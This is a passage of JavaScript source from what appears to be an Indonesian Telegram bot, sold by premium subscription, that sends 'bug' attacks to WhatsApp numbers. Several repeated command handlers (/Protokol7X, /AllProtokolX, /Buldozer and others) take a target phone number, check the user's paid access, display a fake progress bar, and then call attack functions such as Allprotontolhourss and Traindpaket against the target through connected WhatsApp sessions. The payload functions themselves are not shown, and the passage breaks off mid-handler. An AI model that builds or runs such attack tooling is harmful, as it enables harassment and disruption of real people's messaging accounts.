      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontolhourss(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Protokol7X\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontolhourss(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Protokol8X\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontolhourss(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/AllProtokolX\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontolhourss(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//



//AKHIR CASE DELAY HOURS//



//=======CASE BUG=========//
bot.onText(/\/Buldozer\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Traindpaket(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/BuldozerV2\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Traindpaket(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/BuldozerV3\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
